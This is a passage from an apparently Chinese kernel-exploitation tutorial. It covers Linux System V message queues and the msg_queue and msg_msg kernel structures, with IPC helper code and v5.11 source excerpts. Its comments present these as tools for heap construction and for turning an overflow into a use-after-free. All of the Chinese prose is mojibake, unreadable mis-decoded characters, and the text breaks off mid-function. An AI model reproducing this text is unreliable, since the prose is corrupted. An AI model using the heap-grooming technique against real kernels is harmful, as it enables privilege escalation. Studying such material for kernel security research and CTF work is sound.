<p>ç„¶åå°±å¯ä»¥ä¾æ®<code>queue_id</code>å†™å…¥æ¶ˆæ¯äº†ï¼Œä¸åŒäº<code>pipe</code>å’Œ<code>socketpair</code>ï¼Œè¿™ä¸ªéœ€è¦ç‰¹å®šçš„å°è£…å‡½æ•°ï¼ˆ<code>msgsnd/msgrcv</code>ï¼‰æˆ–è€…å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨ï¼ˆ<code>__NR_msgrcv/__NR_msgsnd</code>ï¼‰æ¥å®ç°ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line">        <span class="keyword">char</span> mtext[<span class="number">1</span>];</span><br><span class="line">&#125;msgp;</span><br><span class="line"></span><br><span class="line"><span class="comment">//msg_bufå®é™…ä¸Šä¸ºmsgp,é‡Œé¢åŒ…å«mtype,è¿™ä¸ªmtypeåœ¨åé¢çš„å †å—æ„é€ ä¸­å¾ˆæœ‰ç”¨</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_msg</span><span class="params">(<span class="keyword">int</span> msg_queue_id, <span class="keyword">void</span> *msg_buf, <span class="keyword">size_t</span> msg_size, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgsend failure&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> queue_send_buf[<span class="number">0x2000</span>];</span><br><span class="line">m_ts_size = <span class="number">0x400</span><span class="number">-0x30</span>;<span class="comment">//ä»»æ„æŒ‡å®š</span></span><br><span class="line">msg *message = (msg *)queue_send_buf;</span><br><span class="line">message-&gt;mtype = <span class="number">0</span>;</span><br><span class="line">send_msg(queue_id, message, m_ts_size, <span class="number">0</span>);</span><br></pre></td></tr></table></div></figure></li>
<li><p>è¯»å–æ¶ˆæ¯ï¼š</p>
<p>ä¹‹åå³å¯ä¾æ®<code>queue_id</code>è¯»å–æ¶ˆæ¯</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_msg</span><span class="params">(<span class="keyword">int</span> msg_queue_id, <span class="keyword">void</span> *msg_buf, <span class="keyword">size_t</span> msg_size, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgrcv&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> queue_recv_buf[<span class="number">0x2000</span>];</span><br><span class="line">m_ts_size = <span class="number">0x400</span><span class="number">-0x30</span>;<span class="comment">//ä»»æ„æŒ‡å®š</span></span><br><span class="line">get_msg(queue_id, queue_recv_buf, m_ts_size, <span class="number">0</span>, IPC_NOWAIT | MSG_COPY);</span><br></pre></td></tr></table></div></figure></li>
<li><p><code>mtype</code></p>
<p>å¯é€šè¿‡è®¾ç½®è¯¥å€¼æ¥å®ç°ä¸åŒé¡ºåºçš„æ¶ˆæ¯è¯»å–ï¼Œåœ¨ä¹‹åçš„å †å—æ„é€ ä¸­å¾ˆæœ‰ç”¨</p>
<ul>
<li>åœ¨å†™å…¥æ¶ˆæ¯æ—¶ï¼ŒæŒ‡å®š<code>mtype</code>ï¼Œåç»­æ¥æ”¶æ¶ˆæ¯æ—¶å¯ä»¥ä¾æ®æ­¤<code>mtype</code>æ¥è¿›è¡Œéé¡ºåºæ¥æ”¶</li>
<li>åœ¨è¯»å–æ¶ˆæ¯æ—¶ï¼ŒæŒ‡å®š<code>msgtyp</code>ï¼Œåˆ†ä¸ºå¦‚ä¸‹æƒ…å†µ<ul>
<li><code>msgtyp</code>å¤§äº0ï¼šé‚£ä¹ˆåœ¨<code>find_msg</code>å‡½æ•°ä¸­ï¼Œå°±ä¼šå°†éå†å¯»æ‰¾æ¶ˆæ¯é˜Ÿåˆ—é‡Œçš„ç¬¬ä¸€æ¡ç­‰äº<code>msgtyp</code>çš„æ¶ˆæ¯ï¼Œç„¶åè¿›è¡Œåç»­æ“ä½œã€‚</li>
<li><code>msgtyp</code>ç­‰äº0ï¼šå³ç±»ä¼¼äºé¡ºåºè¯»å–ï¼Œ<code>find_msg</code>å‡½æ•°ä¼šç›´æ¥è·å–åˆ°æ¶ˆæ¯é˜Ÿåˆ—é¦–ä¸ªæ¶ˆæ¯ã€‚</li>
<li><code>msgtyp</code>å°äº0ï¼šä¼šå°†ç­‰å¾…çš„æ¶ˆæ¯å½“æˆä¼˜å…ˆé˜Ÿåˆ—æ¥å¤„ç†ï¼Œ<code>mtype</code>çš„å€¼è¶Šå°ï¼Œå…¶ä¼˜å…ˆçº§è¶Šé«˜ã€‚</li>
</ul>
</li>
</ul>
</li>
<li><p><code>msg_flag</code></p>
</li>
</ul>
<p>å¯ä»¥å…³æ³¨ä¸€ä¸‹<code>MSG_NOERROR</code>æ ‡å¿—ä½ï¼Œæ¯”å¦‚è¯´<code>msg_flag</code>æ²¡æœ‰è®¾ç½®<code>MSG_NOERROR</code>çš„æ—¶å€™ï¼Œé‚£ä¹ˆæƒ…å†µå¦‚ä¸‹ï¼š</p>
<p>å‡å®šè·å–æ¶ˆæ¯æ—¶è¾“å…¥çš„é•¿åº¦<code>m_ts_size</code>ä¸º<code>0x200</code>ï¼Œä¸”è¿™ä¸ªé•¿åº¦å¤§äºé€šè¿‡<code>find_msg()</code>å‡½æ•°è·å–åˆ°çš„æ¶ˆæ¯é•¿åº¦<code>0x200</code>ï¼Œåˆ™å¯ä»¥é¡ºåˆ©è¯»å–ï¼Œå¦‚æœè¯¥é•¿åº¦å°äºè·å–åˆ°çš„æ¶ˆæ¯é•¿åº¦<code>0x200</code>ï¼Œåˆ™ä¼šå‡ºç°å¦‚ä¸‹é”™è¯¯</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511193452872.png"></p>
<p>ä½†æ˜¯å¦‚æœè®¾ç½®äº†<code>MSG_NOERROR</code>ï¼Œé‚£ä¹ˆå³ä½¿ä¼ å…¥æ¥æ”¶æ¶ˆæ¯çš„é•¿åº¦å°äºè·å–åˆ°çš„æ¶ˆæ¯é•¿åº¦ï¼Œä»ç„¶å¯ä»¥é¡ºåˆ©è·å–ï¼Œä½†æ˜¯å¤šä½™çš„æ¶ˆæ¯ä¼šè¢«æˆªæ–­ï¼Œç›¸å…³å†…å­˜è¿˜æ˜¯ä¼šè¢«é‡Šæ”¾ï¼Œè¿™ä¸ªåœ¨æºä»£ç ä¸­ä¹Ÿæœ‰æ‰€ä½“ç°ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msg.c do_msgrcvå‡½æ•°ä¸­</span></span><br><span class="line"><span class="keyword">if</span> ((bufsz &lt; msg-&gt;m_ts) &amp;&amp; !(msgflg &amp; MSG_NOERROR)) &#123;</span><br><span class="line">    msg = ERR_PTR(-E2BIG);</span><br><span class="line">    <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>æ­¤å¤–è¿˜æœ‰æ›´å¤šçš„<code>msg_flag</code>ï¼Œå°±ä¸ä¸€ä¸€ä¸¾ä¾‹äº†ã€‚</p>

        <h4 id="â‘¢é‡Šæ”¾"   >
          <a href="#â‘¢é‡Šæ”¾" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¢é‡Šæ”¾" class="headerlink" title="â‘¢é‡Šæ”¾"></a>â‘¢é‡Šæ”¾</h4>
      <p>è¿™ä¸ªä¸»è¦æ˜¯ç”¨åˆ°<code>msgctl</code>å°è£…å‡½æ•°æˆ–è€…<code>__NR_msgctl</code>ç³»ç»Ÿè°ƒç”¨ï¼Œç›´æ¥é‡Šæ”¾æ‰æ‰€æœ‰çš„æ¶ˆæ¯ç»“æ„ï¼ŒåŒ…æ‹¬ç”³è¯·çš„<code>msg_queue</code>çš„ç»“æ„</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å…¶ä¸­IPC_RMIDè¿™ä¸ªcmdå‘½ä»¤ä»£è¡¨é‡Šæ”¾æ‰è¯¥æ¶ˆæ¯é˜Ÿåˆ—çš„æ‰€æœ‰æ¶ˆæ¯,å„ç§å†…å­˜ç»“æ„ä½“ç­‰</span></span><br><span class="line"><span class="keyword">if</span>(msgctl(queue_id,IPC_RMID,<span class="literal">NULL</span>)==<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    perror(<span class="string">&quot;msgctl&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>ä¸è¿‡ä¸€èˆ¬ä¹Ÿç”¨ä¸åˆ°ï¼Œå¯èƒ½æŸäº›åˆå¹¶objçš„æƒ…å†µèƒ½ç”¨åˆ°?</p>
<p>æ­¤å¤–è¿˜æœ‰æ›´å¤šçš„<code>cmd</code>å‘½ä»¤ï¼Œå¸¸ç”¨æ¥è®¾ç½®å†…æ ¸ç©ºé—´çš„<code>msg_queue</code>ç»“æ„ä¸Šçš„ç›¸å…³æ•°æ®ï¼Œä¸è¿‡å¤šä»‹ç»äº†ã€‚</p>

        <h4 id="æ€»ç»“"   >
          <a href="#æ€»ç»“" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4>
      <p>æ€»ç»“ä¸€ä¸‹å¤§è‡´çš„ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line">        <span class="keyword">char</span> mtext[<span class="number">1</span>];</span><br><span class="line">&#125;msgp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int32_t</span> <span class="title">make_queue</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> result;</span><br><span class="line">    <span class="keyword">if</span> ((result = msgget(key, msg_flag)) == <span class="number">-1</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgget failure&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_msg</span><span class="params">(<span class="keyword">int</span> msg_queue_id, <span class="keyword">void</span> *msg_buf, <span class="keyword">size_t</span> msg_size, <span class="keyword">long</span> msgtyp, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msg_queue_id, msg_buf, msg_size, msgtyp, msg_flag) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgrcv&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_msg</span><span class="params">(<span class="keyword">int</span> msg_queue_id, <span class="keyword">void</span> *msg_buf, <span class="keyword">size_t</span> msg_size, <span class="keyword">int</span> msg_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgsend failure&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> queue_id, m_ts_size;</span><br><span class="line">    <span class="keyword">char</span> queue_recv_buf[<span class="number">0x2000</span>];</span><br><span class="line">    <span class="keyword">char</span> queue_send_buf[<span class="number">0x2000</span>];</span><br><span class="line">    </span><br><span class="line">    m_ts_size = <span class="number">0x400</span><span class="number">-0x30</span>;</span><br><span class="line">    msgp *message = (msgp *)queue_send_buf;</span><br><span class="line">    message-&gt;mtype = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(message-&gt;mtext,<span class="string">&#x27;\xaa&#x27;</span>, m_ts_size);</span><br><span class="line">    <span class="built_in">memset</span>(queue_recv_buf, <span class="string">&#x27;\xbb&#x27;</span>, <span class="keyword">sizeof</span>(queue_recv_buf));</span><br><span class="line">    </span><br><span class="line">    queue_id = make_queue(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">    send_msg(queue_id, message, m_ts_size, <span class="number">0</span>);</span><br><span class="line">    get_msg(queue_id, queue_recv_buf, m_ts_size, <span class="number">0</span>, IPC_NOWAIT | MSG_COPY);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-å†…å­˜åˆ†é…ä¸é‡Šæ”¾"   >
          <a href="#2-å†…å­˜åˆ†é…ä¸é‡Šæ”¾" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å†…å­˜åˆ†é…ä¸é‡Šæ”¾" class="headerlink" title="(2)å†…å­˜åˆ†é…ä¸é‡Šæ”¾"></a>(2)å†…å­˜åˆ†é…ä¸é‡Šæ”¾</h3>
      
        <h4 id="â‘ åˆ›å»º-1"   >
          <a href="#â‘ åˆ›å»º-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ åˆ›å»º-1" class="headerlink" title="â‘ åˆ›å»º"></a>â‘ åˆ›å»º</h4>
      
        <h5 id="A-å†…å­˜ç”³è¯·"   >
          <a href="#A-å†…å­˜ç”³è¯·" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-å†…å­˜ç”³è¯·" class="headerlink" title="A.å†…å­˜ç”³è¯·"></a>A.å†…å­˜ç”³è¯·</h5>
      <ul>
<li><p>è¿˜æ˜¯éœ€è¦å…ˆåˆ›å»º<code>msg_queue</code>ç»“æ„ä½“ï¼Œä½¿ç”¨<code>msgget</code>å‡½æ•°ï¼Œè°ƒç”¨é“¾ä¸º</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msgget(key,msg_flag)-&gt;ksys_msgget()-&gt;ipcget()-&gt;ipcget_new()-&gt;newque()</span><br></pre></td></tr></table></div></figure>

<p>ä¸»è¦è¿˜æ˜¯å…³æ³¨æœ€åçš„<code>newque()</code>å‡½æ•°ï¼Œåœ¨è¯¥å‡½æ•°ä¸­ä½¿ç”¨<code>kvmalloc()</code>ç”³è¯·å †å—ï¼Œå¤§å°ä¸º0x100ï¼Œå±äº<code>kmalloc-256</code>ï¼Œ(ä¸åŒç‰ˆæœ¬å¤§å°è²Œä¼¼ä¸åŒ)ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msg.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">newque</span><span class="params">(struct ipc_namespace *ns, struct ipc_params *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line">	<span class="keyword">int</span> retval;</span><br><span class="line">	<span class="keyword">key_t</span> key = params-&gt;key;</span><br><span class="line">	<span class="keyword">int</span> msgflg = params-&gt;flg;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//è¿™ä¸ªæ‰æ˜¯å®é™…ç”³è¯·çš„å †å—å†…å­˜</span></span><br><span class="line">	msq = kvmalloc(<span class="keyword">sizeof</span>(*msq), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!msq))</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	msq-&gt;q_perm.mode = msgflg &amp; S_IRWXUGO;</span><br><span class="line">	msq-&gt;q_perm.key = key;</span><br><span class="line"></span><br><span class="line">	msq-&gt;q_perm.security = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">//è¿›è¡Œç›¸å…³æ³¨å†Œ</span></span><br><span class="line">	retval = security_msg_queue_alloc(&amp;msq-&gt;q_perm);</span><br><span class="line">	<span class="keyword">if</span> (retval) &#123;</span><br><span class="line">		kvfree(msq);</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//åˆå§‹åŒ–</span></span><br><span class="line">	msq-&gt;q_stime = msq-&gt;q_rtime = <span class="number">0</span>;</span><br><span class="line">	msq-&gt;q_ctime = ktime_get_real_seconds();</span><br><span class="line">	msq-&gt;q_cbytes = msq-&gt;q_qnum = <span class="number">0</span>;</span><br><span class="line">	msq-&gt;q_qbytes = ns-&gt;msg_ctlmnb;</span><br><span class="line">	msq-&gt;q_lspid = msq-&gt;q_lrpid = <span class="literal">NULL</span>;</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_messages);</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_receivers);</span><br><span class="line">	INIT_LIST_HEAD(&amp;msq-&gt;q_senders);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ä¸‹é¢ä¸€å †çœ‹ä¸æ‡‚åœ¨å¹²å•¥</span></span><br><span class="line">	<span class="comment">/* ipc_addid() locks msq upon success. */</span></span><br><span class="line">	retval = ipc_addid(&amp;msg_ids(ns), &amp;msq-&gt;q_perm, ns-&gt;msg_ctlmni);</span><br><span class="line">	<span class="keyword">if</span> (retval &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		ipc_rcu_putref(&amp;msq-&gt;q_perm, msg_rcu_free);</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line">	&#125;</span><br><span class="line">	ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> msq-&gt;q_perm.id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>åˆ›å»ºçš„ç»“æ„ä½“å¦‚ä¸‹æ‰€ç¤º</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msg.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> &#123;</span></span><br><span class="line">    <span class="comment">//è¿™äº›ä¸ºä¸€äº›ç›¸å…³ä¿¡æ¯</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span> <span class="title">q_perm</span>;</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_stime;		<span class="comment">/* last msgsnd time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_rtime;		<span class="comment">/* last msgrcv time */</span></span><br><span class="line">	<span class="keyword">time64_t</span> q_ctime;		<span class="comment">/* last change time */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_cbytes;		<span class="comment">/* current number of bytes on queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qnum;		<span class="comment">/* number of messages in queue */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> q_qbytes;		<span class="comment">/* max number of bytes on queue */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lspid</span>;</span>		<span class="comment">/* pid of last msgsnd */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lrpid</span>;</span>		<span class="comment">/* last receive pid */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//å­˜æ”¾msg_msgç›¸å…³æŒ‡é’ˆnextã€prev,æ¯”è¾ƒé‡è¦,é€šå¸¸æ‹¿æ¥æº¢å‡ºåˆ¶é€ UAF</span></span><br><span class="line">    <span class="comment">//å’Œè¯¥æ¶ˆæ¯é˜Ÿåˆ—é‡Œçš„æ‰€æœ‰æ¶ˆæ¯ç»„æˆåŒå‘å¾ªç¯é“¾è¡¨</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_messages</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_receivers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_senders</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure></li>
<li><p>æ¥ç€å½“ä½¿ç”¨<code>msgsnd</code>å‡½æ•°ä¼ é€’æ¶ˆæ¯æ—¶ï¼Œä¼šåˆ›å»ºæ–°çš„<code>msg_msg</code>ç»“æ„ä½“ï¼Œæ¶ˆæ¯è¿‡é•¿çš„è¯å°±ä¼šåˆ›å»ºæ›´å¤šçš„<code>msg_msgseg</code>æ¥å­˜å‚¨æ›´å¤šçš„æ¶ˆæ¯ã€‚ç›¸å…³çš„å‡½æ•°è°ƒç”¨é“¾å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msgsnd(msg_queue_id, msg_buf, msg_size, msg_flag)-&gt;do_msgsnd()-&gt;load_msg()-&gt;alloc_msg()</span><br></pre></td></tr></table></div></figure>

<p>ä¸»è¦è¿˜æ˜¯å…³æ³¨åœ¨<code>alloc_msg()</code>å‡½æ•°</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.11 /ipc/msgutil.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct msg_msg *<span class="title">alloc_msg</span><span class="params">(<span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> **<span class="title">pseg</span>;</span></span><br><span class="line">	<span class="keyword">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æœ€å¤§å‘é€DATALEN_MSGé•¿åº¦çš„æ¶ˆæ¯</span></span><br><span class="line">    <span class="comment">//#define DATALEN_MSG	((size_t)PAGE_SIZE-sizeof(struct msg_msg))</span></span><br><span class="line">    <span class="comment">//è¿™é‡Œçš„PAGE_SIZEä¸º0x400,å³æœ€å¤škmalloc-</span></span><br><span class="line">	alen = min(len, DATALEN_MSG);</span><br><span class="line">    <span class="comment">//ä½¿ç”¨æ­£å¸¸</span></span><br><span class="line">	msg = kmalloc(<span class="keyword">sizeof</span>(*msg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">	<span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> 